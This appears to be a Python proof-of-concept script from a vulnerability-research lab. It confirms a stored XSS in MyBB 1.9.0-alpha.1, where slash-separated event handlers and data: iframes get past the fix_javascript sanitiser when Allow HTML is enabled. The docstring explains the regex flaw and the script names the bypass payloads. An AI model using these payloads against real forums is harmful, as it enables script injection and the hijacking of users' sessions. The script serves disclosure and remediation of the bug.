#!/usr/bin/env python3
"""
VULN-006 — Stored XSS via bypassable `fix_javascript` when "Allow HTML" is enabled.

Target  : MyBB 1.9.0-alpha.1 (dev-1.9, commit f8bf4e8)
Sink    : inc/class_parser.php:188-202 (allow_html branch) + :799-810 (fix_javascript)
Class   : CWE-79 Stored XSS (blocklist-sanitiser bypass) — CONDITIONAL on a default-off flag

The flaw
--------
In allow_html mode the ONLY scripting defence is fix_javascript(), whose
event-handler regex is  #([\\s"']on)([a-z]+\\s*=)#i  — it only neutralises `on...=`
when preceded by whitespace/`"`/`'`. A `/` separator bypasses it, so `<svg/onload=>`
and `<img src=x/onerror=>` survive; and non-event tags such as `<iframe src=data:>`
survive because only base/meta/script/style are stripped. The result renders raw
(allow_html skips parse_html AND the output XML-validation at :2027).

Conditionality
--------------
On the documented secure baseline all four Allow HTML flags are OFF (the Security
Guide says keep them off), so this branch is unreachable. It becomes live stored XSS
the moment an operator enables any of: per-forum `forums.allowhtml`, `sightml`,
`pmsallowhtml`, `announcementshtml`. MyBB *promises* allow_html content is sanitised
for untrusted authors — the promise is false because the sanitiser is bypassable.

How this is proven
------------------
The authoritative test of a sanitiser bypass is to run the sanitiser on the payload.
This exploit executes MyBB's OWN postParser::parse_message() with allow_html=1 inside
the live app container (parse_probe.php via docker exec) on four payloads and shows
that the `/`-separated handlers and the `<iframe>` pass through UN-neutralised, while
the space-separated form is correctly neutralised (a U+200C is inserted). That is the
exact HTML that would be emitted into a post/signature/PM/announcement and rendered
raw once an Allow HTML flag is on.

(Note: in this 1.9-alpha, showthread.php additionally returns HTTP 503 for ANY thread
in a forum with allowhtml=1 — a separate rendering fault — so end-to-end firing of the
payload in a rendered forum page could not be captured here; see notes.md. The bypass
itself — the vulnerability — is confirmed by the parser output.)
"""
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import mybb_common as m

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31", "WARN": "33"}


def log(tag, msg):
    print((f"\033[1;{_C[tag]}m[{tag}]\033[0m " if _USE_COLOR and tag in _C else f"[{tag}] ") + msg)


HERE = os.path.dirname(os.path.abspath(__file__))
BASE = m.BASE_URL
APP = os.environ.get("APP_CONTAINER", "cvehunterlab_mybb_app")


def main():
    print("=" * 72)
    print("VULN-006: fix_javascript bypass -> stored XSS when Allow HTML is enabled")
    print(f"Target: {BASE}")
    print("=" * 72)
    log("INFO", "running MyBB's own postParser::parse_message(allow_html=1) on bypass payloads")
    log("WARN", "CONDITIONAL: requires an operator to enable an Allow HTML flag (all four default OFF)")

    # run the authoritative parser probe inside the live container
    probe = os.path.join(HERE, "parse_probe.php")
    subprocess.run(["docker", "cp", probe, f"{APP}:/tmp/parse_probe.php"],
                   capture_output=True, text=True)
    out = subprocess.run(["docker", "exec", "-i", APP, "php", "/tmp/parse_probe.php"],
                         capture_output=True, text=True)
    results = {}
    lines = []
    for line in out.stdout.splitlines():
        if line.startswith("RESULT|"):
            _, label, neut, intact, rendered = line.split("|", 4)
            results[label] = {"neutralised": neut == "1", "intact": intact == "1", "out": rendered}
            lines.append(line)

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# precondition: operator enables an Allow HTML flag (e.g. forums.allowhtml=1 / sightml=1)\n"
                "# then any post/signature/PM/announcement body is parsed with allow_html=1.\n"
                "# This run drives MyBB's own parser (parse_probe.php) in the app container.\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("postParser::parse_message(payload, {allow_html:1}) output per payload\n")
        f.write("(fix_javascript inserts U+200C between 'on' and the handler when it MATCHES)\n\n")
        f.write("\n".join(lines) + "\n")

    # report each case
    for label in ("img_space_onerror", "svg_slash_onload", "img_slash_onerror", "iframe_data"):
        r = results.get(label)
        if not r:
            continue
        log("INFO", f"  {label:18s} -> neutralised={r['neutralised']} handler/tag intact={r['intact']} | {r['out'].strip()[:70]}")

    # the control: the space form MUST be neutralised (proves the sanitiser is active)
    control_ok = results.get("img_space_onerror", {}).get("neutralised", False)
    # the bypasses: handlers/tags survive UN-neutralised
    bypass_svg = results.get("svg_slash_onload", {})
    bypass_img = results.get("img_slash_onerror", {})
    bypass_iframe = results.get("iframe_data", {})
    bypasses = []
    if bypass_svg.get("intact") and not bypass_svg.get("neutralised"):
        bypasses.append("<svg/onload=>")
    if bypass_img.get("intact") and not bypass_img.get("neutralised"):
        bypasses.append("<img src=x/onerror=>")
    if bypass_iframe.get("intact") and not bypass_iframe.get("neutralised"):
        bypasses.append("<iframe src=data:>")

    if control_ok:
        log("PROOF", "control: `<img src=x onerror=>` IS neutralised (U+200C inserted) — the sanitiser runs")
    if bypasses:
        log("PROOF", "bypass: " + ", ".join(bypasses) + " pass through fix_javascript UN-neutralised and "
                     "render as live HTML — stored XSS when an Allow HTML flag is enabled")

    print("-" * 72)
    if control_ok and bypasses:
        log("OK", "exploit confirmed — fix_javascript is bypassable; dangerous HTML survives in allow_html mode")
        log("WARN", "not reachable on the documented secure baseline (Allow HTML flags default off); "
                    "fix the sanitiser regardless of the flag")
        print("==> VULN-006: CONFIRMED (conditional) — fix_javascript '/'-separator & non-event bypass -> "
              "stored XSS when an Allow HTML flag is enabled (default off)")
        return 0
    log("FAIL", "could not reproduce the bypass (control neutralised=%s, bypasses=%s)"
        % (control_ok, bypasses))
    print("==> VULN-006: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
